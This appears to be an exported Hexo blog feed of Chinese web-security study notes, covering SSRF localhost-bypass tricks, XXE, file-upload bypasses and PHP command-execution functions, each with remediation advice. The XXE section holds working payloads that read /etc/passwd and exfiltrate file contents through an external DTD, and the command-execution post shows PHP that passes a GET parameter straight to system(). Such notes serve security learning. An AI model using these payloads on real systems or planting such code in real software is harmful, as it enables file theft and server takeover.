<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1.xip.io/flag.php -&gt; http://127.0.0.1/flag.php</span><br></pre></td></tr></table></figure></div>

<h2 id="进制转换"><a href="#进制转换" class="headerlink" title="进制转换"></a>进制转换</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.sojson.com/hexconvert.html</span><br><span class="line"></span><br><span class="line">127.0.0.1</span><br><span class="line">八进制:</span><br><span class="line">0177.0.0.1</span><br><span class="line">十六进制:</span><br><span class="line">0x7f.0.0.1</span><br></pre></td></tr></table></figure></div>

<h2 id="利用"><a href="#利用" class="headerlink" title="利用[::]"></a>利用[::]</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">利用[::]绕过localhost </span><br><span class="line">http://[::]:80   -&gt;  http://127.0.0.1</span><br></pre></td></tr></table></figure></div>

<h2 id="指向127-0-0-1"><a href="#指向127-0-0-1" class="headerlink" title="指向127.0.0.1"></a>指向127.0.0.1</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:80</span><br><span class="line">http://127.0.0.1:443</span><br><span class="line">http://127.0.0.1:22</span><br><span class="line">http://127.1:80</span><br><span class="line">http://0</span><br><span class="line">http://0.0.0.0:80</span><br><span class="line">http://localhost:80</span><br><span class="line">http://[::]:80/</span><br><span class="line">http://[::]:25/ SMTP</span><br><span class="line">http://[::]:3128/ Squid</span><br><span class="line">http://[0000::1]:80/</span><br><span class="line">http://[0:0:0:0:0:ffff:127.0.0.1]/thefile</span><br><span class="line">http://①②⑦.⓪.⓪.⓪</span><br></pre></td></tr></table></figure></div>

<h2 id="用句号绕过"><a href="#用句号绕过" class="headerlink" title="用句号绕过"></a>用句号绕过</h2><ul>
<li>PHP &gt; 5.5.9</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">127。0。0。1 -&gt; 127.0.0.1</span><br></pre></td></tr></table></figure></div>

<h1 id="0x06-防御"><a href="#0x06-防御" class="headerlink" title="0x06 防御"></a>0x06 防御</h1><p>1.过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符号标准。<br>2.统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。<br>3.限制请求的端口为http常用的端口，比如80，443，8080，8090。<br>4.黑名单内网IP，避免应用被用来获取内网数据，攻击内网。<br>5.禁用不需要的协议，仅仅允许http和https请求，可以防止类似file:&#x2F;&#x2F;、gopher:&#x2F;&#x2F;等协议引起的问题。</p>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>SSRF</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2023/08/15/Web%E5%AE%89%E5%85%A8/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a class="link"   href="https://hexo.io/" >Hexo <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>! This is your very first post. Check <a class="link"   href="https://hexo.io/docs/" >documentation <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> for more info. If you get any problems when using Hexo, you can find the answer in <a class="link"   href="https://hexo.io/docs/troubleshooting.html" >troubleshooting <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> or you can ask me on <a class="link"   href="https://github.com/hexojs/hexo/issues" >GitHub <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure></div>

<p>More info: <a class="link"   href="https://hexo.io/docs/writing.html" >Writing <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure></div>

<p>More info: <a class="link"   href="https://hexo.io/docs/server.html" >Server <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure></div>

<p>More info: <a class="link"   href="https://hexo.io/docs/generating.html" >Generating <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure></div>

<p>More info: <a class="link"   href="https://hexo.io/docs/one-command-deployment.html" >Deployment <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <tags>
        <tag>Hello World</tag>
      </tags>
  </entry>
  <entry>
    <title>XXE</title>
    <url>/2023/09/03/Web%E5%AE%89%E5%85%A8/XXE%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h1 id="0x00-基础知识"><a href="#0x00-基础知识" class="headerlink" title="0x00 基础知识"></a>0x00 基础知识</h1><h2 id="什么是XML？"><a href="#什么是XML？" class="headerlink" title="什么是XML？"></a>什么是XML？</h2><p>XML 指可扩展标记语言，被设计用来传输和存储数据，不用于表现和展示数据，HTML 则用来表现数据。</p>
<h2 id="XML格式"><a href="#XML格式" class="headerlink" title="XML格式"></a>XML格式</h2><ul>
<li>XML 文档第一行以 XML 声明开始，用来表述文档的一些信息（版本，编码信息）</li>
</ul>
<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br></pre></td></tr></table></figure></div>

<ul>
<li>DTD 文档类型定义（DTD）可定义合法的XML文档构建模块，可被成行地声明于 XML 文档中，也可作为一个外部引用。</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">	&lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">	&lt;!ELEMENT to (#PCDATA)&gt;</span><br><span class="line">	&lt;!ELEMENT from (#PCDATA)&gt;</span><br><span class="line">	&lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">	&lt;!ELEMENT body (#PCDATA)&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">	&lt;to&gt;Tove&lt;/to&gt;</span><br><span class="line">	&lt;from&gt;Jani&lt;/from&gt;</span><br><span class="line">	&lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">	&lt;body&gt;Dont forget me this weekend&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure></div>

<ul>
<li>示例</li>
</ul>
<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span> <span class="comment">&lt;!--XML声明--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--DTD，这部分可选的--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ELEMENT <span class="keyword">foo</span> <span class="keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///c:/windows/win.ini&quot;</span> &gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="comment">&lt;!--文档元素--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">to</span>&gt;</span>Tove<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">from</span>&gt;</span>Jani<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget me this weekend!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<h2 id="实体"><a href="#实体" class="headerlink" title="实体"></a>实体</h2><h3 id="内部实体"><a href="#内部实体" class="headerlink" title="内部实体"></a>内部实体</h3><h3 id="外部实体"><a href="#外部实体" class="headerlink" title="外部实体"></a>外部实体</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///path/file&quot; &gt;]&gt;</span><br><span class="line">&lt;creds&gt;</span><br><span class="line">    &lt;user&gt;&amp;xxe;&lt;/user&gt;</span><br><span class="line">&lt;/creds&gt;</span><br></pre></td></tr></table></figure></div>

<h3 id="参数实体"><a href="#参数实体" class="headerlink" title="参数实体"></a>参数实体</h3><ul>
<li>使用 <code>% 实体名 ;</code>在 DTD 中定义，并且<strong>只能在 DTD 中使用 <code>%实体名;</code> 引用</strong></li>
<li>只有在 DTD 文件中，参数实体的声明才能引用其他实体</li>
<li>和通用实体一样，参数实体也可以外部引用</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">&lt;!ENTITY % b &quot;&lt;!ENTITY b1 &quot;awsl&quot;&gt;&quot;&gt;</span><br><span class="line">%b;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure></div>

<h2 id="各语言XML解析支持的协议"><a href="#各语言XML解析支持的协议" class="headerlink" title="各语言XML解析支持的协议"></a>各语言XML解析支持的协议</h2><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/03/Web%E5%AE%89%E5%85%A8/XXE%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/image-01.png"
                      class="" title="image-image-01"
                >

<p><strong>注意：</strong></p>
<ul>
<li>其中从2012年9月开始，Oracle JDK版本中删除了对gopher方案的支持，后来又支持的版本是 Oracle JDK 1.7 update 7 和 Oracle JDK 1.6 update 35</li>
<li>libxml 是 PHP 的 xml 支持</li>
</ul>
<h1 id="0x01-入门"><a href="#0x01-入门" class="headerlink" title="0x01 入门"></a>0x01 入门</h1><h2 id="什么是XML实体注入？"><a href="#什么是XML实体注入？" class="headerlink" title="什么是XML实体注入？"></a>什么是XML实体注入？</h2><p>XML 外部实体注入（也称为 XXE）是一种 Web 安全漏洞，允许攻击者干扰应用程序对 XML 数据的处理。它通常允许攻击者查看应用程序服务器文件系统上的文件，并与应用程序本身可以访问的任何后端或外部系统进行交互。</p>
<h2 id="XML实体注入原理"><a href="#XML实体注入原理" class="headerlink" title="XML实体注入原理"></a>XML实体注入原理</h2><p>用户输入的数据被当做XML实体代码进行执行。</p>
<h1 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h1><h2 id="实验靶场"><a href="#实验靶场" class="headerlink" title="实验靶场"></a>实验靶场</h2><p><a class="link"   href="https://portswigger.net/web-security/all-labs#xml-external-entity-xxe-injection" >https://portswigger.net/web-security/all-labs#xml-external-entity-xxe-injection <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h2 id="回显读取文件"><a href="#回显读取文件" class="headerlink" title="回显读取文件"></a>回显读取文件</h2><p>payload：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE test [ </span><br><span class="line">	&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt; </span><br><span class="line">]&gt;</span><br><span class="line">&lt;stockCheck&gt;</span><br><span class="line">	&lt;productId&gt;</span><br><span class="line">		&amp;xxe;</span><br><span class="line">	&lt;/productId&gt;</span><br><span class="line">	&lt;storeId&gt;</span><br><span class="line">		1</span><br><span class="line">	&lt;/storeId&gt;</span><br><span class="line">&lt;/stockCheck&gt;</span><br></pre></td></tr></table></figure></div>

<h2 id="无回显读取文件"><a href="#无回显读取文件" class="headerlink" title="无回显读取文件"></a>无回显读取文件</h2><ul>
<li>通过构造一个带外的url将数据带出。</li>
</ul>
<p>payload：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">        &lt;!ENTITY % xxe SYSTEM &quot;my.dtd-url&quot;&gt;	&lt;!-- mydtd放在自己服务器的外部实体 --&gt;</span><br><span class="line">%xxe;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure></div>

<p>my.dtd内容:</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///etc/hostname&quot;&gt;</span><br><span class="line">&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; exfil SYSTEM &#x27;my.dtd-url?x=%file;&#x27;&gt;&quot;&gt;</span><br><span class="line">%eval;</span><br><span class="line">%exfil;</span><br></pre></td></tr></table></figure></div>

<p>注：文件中包含的换行符可以使用 FTP 协议而不是 HTTP协议。</p>
<h2 id="报错回显读取文件"><a href="#报错回显读取文件" class="headerlink" title="报错回显读取文件"></a>报错回显读取文件</h2><ul>
<li>通过触发 XML 解析错误，其中错误消息包含希望检索的敏感数据。</li>
</ul>
<p>payload：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM &quot;my.dtd-url&quot;&gt; </span><br><span class="line">%xxe;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure></div>

<p>my.dtd内容：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; error SYSTEM &#x27;file:///do-not-exist/%file;&#x27;&gt;&quot;&gt; &lt;-- do-not-exist文件不存在 --&gt;</span><br><span class="line">%eval;</span><br><span class="line">%error;</span><br></pre></td></tr></table></figure></div>

<h2 id="利用本地DTD读取文件"><a href="#利用本地DTD读取文件" class="headerlink" title="利用本地DTD读取文件"></a>利用本地DTD读取文件</h2><p>查找本地DTD：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">&lt;!ENTITY % local_dtd SYSTEM &quot;file:///local.dtd&quot;&gt;</span><br><span class="line">%local_dtd;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure></div>

<p>payload：重写覆盖掉local-dtd中的实体。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE message [</span><br><span class="line">&lt;!ENTITY % local_dtd SYSTEM &quot;file:///local.dtd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % local.dtd-entity &#x27;</span><br><span class="line">&lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///do-not-exist/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span><br><span class="line">&amp;#x25;eval;</span><br><span class="line">&amp;#x25;error;</span><br><span class="line">&#x27;&gt;</span><br><span class="line">%local_dtd;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure></div>

<h2 id="利用-XInclude-检索文件"><a href="#利用-XInclude-检索文件" class="headerlink" title="利用 XInclude 检索文件"></a>利用 XInclude 检索文件</h2><p>payload：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;foo xmlns:xi=&quot;http://www.w3.org/2001/XInclude&quot;&gt;</span><br><span class="line">&lt;xi:include parse=&quot;text&quot; href=&quot;file:///etc/passwd&quot;/&gt;</span><br><span class="line">&lt;/foo&gt;</span><br></pre></td></tr></table></figure></div>

<h1 id="0x03-漏洞修复"><a href="#0x03-漏洞修复" class="headerlink" title="0x03 漏洞修复"></a>0x03 漏洞修复</h1><p>禁用外部实体解析</p>
<p>禁用对XInclude的支持</p>
<p>过滤关键词</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE、&lt;!ENTITY、SYSTEM、PUBLIC</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>XXE</tag>
      </tags>
  </entry>
  <entry>
    <title>文件上传</title>
    <url>/2023/08/18/Web%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
    <content><![CDATA[<h2 id="一、文件上传的原理"><a href="#一、文件上传的原理" class="headerlink" title="一、文件上传的原理"></a>一、文件上传的原理</h2><p>由于程序员对用户上传功能实现时，没有对其名称、类型、内容或大小等进行验证和限制，导致攻击者可以向服务器上传一个与网站相应的恶意代码文件。如webshell（即ASP木马、PHP木马、JAVA木马等），通过执行这些恶意代码，获取服务器权限等。</p>
<h2 id="二、文件上传的危害"><a href="#二、文件上传的危害" class="headerlink" title="二、文件上传的危害"></a>二、文件上传的危害</h2><p>执行任意代码：攻击者可以上传包含恶意代码的文件，然后在服务器上执行该代码，从而控制服务器并获取敏感信息。</p>
<p>篡改网站内容。</p>
<p>数据泄露。</p>
<p>拒绝服务攻击：上传大量无效文件来占用服务器存储空间和带宽，从而使服务器无法正常工作。</p>
<h2 id="三、文件上传的利用"><a href="#三、文件上传的利用" class="headerlink" title="三、文件上传的利用"></a>三、文件上传的利用</h2><h3 id="前端校验"><a href="#前端校验" class="headerlink" title="前端校验"></a>前端校验</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">传正常文件修改数据包</span><br><span class="line">复写校验函数</span><br><span class="line">用bp修改返回包</span><br><span class="line">禁止js</span><br></pre></td></tr></table></figure></div>

<h3 id="MIME头检测"><a href="#MIME头检测" class="headerlink" title="MIME头检测"></a>MIME头检测</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">修改Content-Type类型</span><br></pre></td></tr></table></figure></div>

<h3 id="黑名单限制不完全"><a href="#黑名单限制不完全" class="headerlink" title="黑名单限制不完全"></a>黑名单限制不完全</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">利用别名绕过</span><br><span class="line">大小写绕过</span><br><span class="line">双写绕过</span><br></pre></td></tr></table></figure></div>

<h3 id="Apache解析漏洞"><a href="#Apache解析漏洞" class="headerlink" title="Apache解析漏洞"></a>Apache解析漏洞</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">. 绕过</span><br></pre></td></tr></table></figure></div>

<h3 id="上传-htaccess"><a href="#上传-htaccess" class="headerlink" title="上传 .htaccess"></a>上传 .htaccess</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">只在apache服务器上起作用。</span><br><span class="line">AllowOverride指令，该指令应设置为All或相应的选项。</span><br><span class="line">AddType application/x-httpd-php //将所有文件按照php文件进行解析。</span><br><span class="line">AddType application/x-httpd-php .jpg //将jpg文件按照php文件进行解析。</span><br></pre></td></tr></table></figure></div>

<h3 id="上传-user-ini"><a href="#上传-user-ini" class="headerlink" title="上传 .user.ini"></a>上传 .user.ini</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">PHP 5.3.0+</span><br><span class="line">.user.ini 风格的 INI 文件中只有具有 PHP_INI_PERDIR 和 PHP_INI_USER 模式的 INI 设置可被识别。此类文件仅被 CGI／FastCGISAPI 处理。</span><br><span class="line">存在可利用 .php 文件</span><br><span class="line">auto_prepend_file=a.jpg //在页面顶部加载文件</span><br><span class="line">auto_append_file=a.jpg  //在页面底部加载文件</span><br></pre></td></tr></table></figure></div>

<h3 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">空格绕过</span><br><span class="line">. 绕过</span><br><span class="line">::$DATA绕过</span><br><span class="line">注：php在window的时候如果文件名+&quot;::$DATA&quot;会把::$DATA之后的数据当成文件流处理,不会检测后缀名，且保持&quot;::$DATA&quot;之前的文件名 他的目的就是不检查后缀名。</span><br></pre></td></tr></table></figure></div>

<h3 id="00截断-GET-POST"><a href="#00截断-GET-POST" class="headerlink" title="%00截断 GET POST"></a>%00截断 GET POST</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt; php6.3.4</span><br><span class="line">magic_quoles Off</span><br></pre></td></tr></table></figure></div>

<h3 id="图片马"><a href="#图片马" class="headerlink" title="图片马"></a>图片马</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">图片马+文件包含漏洞</span><br><span class="line">二次渲染</span><br><span class="line">条件竞争 上传-判断-删除</span><br><span class="line"></span><br><span class="line">补充：</span><br><span class="line">Png图片文件包括8字节：89 50 4E 47 0D 0A 1A 0A。即为.PNG。</span><br><span class="line">Jpg图片文件包括2字节：FF D8。</span><br><span class="line">Gif图片文件包括6字节：47 49 46 38 39|37 61 。即为 GIF89(7)a。</span><br><span class="line">Bmp图片文件包括2字节：42 4D。即为 BM。</span><br></pre></td></tr></table></figure></div>

<h2 id="四、文件上传漏洞修复"><a href="#四、文件上传漏洞修复" class="headerlink" title="四、文件上传漏洞修复"></a>四、文件上传漏洞修复</h2><p>文件类型验证：在上传文件前，必须对文件类型进行严格的检查和校验，仅允许上传已授权的文件类型。</p>
<p>文件内容检查。</p>
<p>上传文件重命名。</p>
<p>隐藏上传文件目录，文件路径随机化。</p>
<p>安全权限设置：对于上传文件所在目录，设置合适的文件访问权限。</p>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title>命令执行</title>
    <url>/2023/08/23/Web%E5%AE%89%E5%85%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
    <content><![CDATA[<h1 id="0x01-介绍"><a href="#0x01-介绍" class="headerlink" title="0x01 介绍"></a>0x01 介绍</h1><p>命令执行漏洞是指应用有时需要调用一些执行系统命令的函数，如：**system()、exec()、shell_exec()、eval()、passthru()**，代码未对用户可控参数做过滤，当用户能控制这些函数中的参数时，就可以将恶意系统命令拼接到正常命令中，从而造成命令执行攻击。</p>
<h1 id="0x02-原理"><a href="#0x02-原理" class="headerlink" title="0x02 原理"></a>0x02 原理</h1><p>用户输入的数据被当做系统命令执行</p>
<h1 id="0x03-系统命令函数"><a href="#0x03-系统命令函数" class="headerlink" title="0x03 系统命令函数"></a>0x03 系统命令函数</h1><h2 id="system"><a href="#system" class="headerlink" title="system"></a>system</h2><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span> ( <span class="keyword">string</span> <span class="variable">$command</span> [, <span class="keyword">int</span> &amp;<span class="variable">$return_var</span> ] )</span><br></pre></td></tr></table></figure></div>

<ul>
<li><strong>$command</strong>为执行的命令</li>
<li><strong>&amp;return_var</strong>可选，用来存放命令执行后的状态码</li>
<li><strong>system()函数</strong>执行有回显，将执行结果输出到页面上</li>
</ul>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$cmd</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">输入：</span></span><br><span class="line"><span class="comment">?cmd = id</span></span><br><span class="line"><span class="comment">输出结果：</span></span><br><span class="line"><span class="comment">uid=1000(www) gid=1000(www) groups=1000(www)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></div>

<h2 id="exec"><a href="#exec" class="headerlink" title="exec"></a>exec</h2><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">exec</span> ( <span class="keyword">string</span> <span class="variable">$command</span> [, <span class="keyword">array</span> &amp;<span class="variable">$output</span> [, <span class="keyword">int</span> &amp;<span class="variable">$return_var</span> ]] )</span><br></pre></td></tr></table></figure></div>

<ul>
<li><code>$command</code>为要执行的命令。</li>
<li><code>$output</code>是获得执行命令输出的每一行字符串</li>
<li><code>$return_var</code>用来保存命令执行的状态码（检测成功或失败）</li>
<li><code>exec()</code>函数执行无回显，默认返回最后一行结果</li>
</ul>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>];</span><br><span class="line"><span class="title function_ invoke__">exec</span>(<span class="variable">$cmd</span>,<span class="variable">$array</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$array</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">输入：</span></span><br><span class="line"><span class="comment">?cmd = id</span></span><br><span class="line"><span class="comment">输出结果：</span></span><br><span class="line"><span class="comment">Array ( [0] =&gt; uid=1000(www) gid=1000(www) groups=1000(www) )</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></div>

<h2 id="passthru"><a href="#passthru" class="headerlink" title="passthru"></a>passthru</h2><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">passthru</span> ( <span class="keyword">string</span> <span class="variable">$command</span> [, <span class="keyword">int</span> &amp;<span class="variable">$return_var</span> ] )</span><br></pre></td></tr></table></figure></div>

<ul>
<li>和<code>system函数</code>类似，<code>$command</code>为执行的命令</li>
<li><code>&amp;return_var</code>可选，用来存放命令执行后的状态码</li>
<li><code>passthru</code>函数执行有回显，将执行结果输出到页面上</li>
</ul>
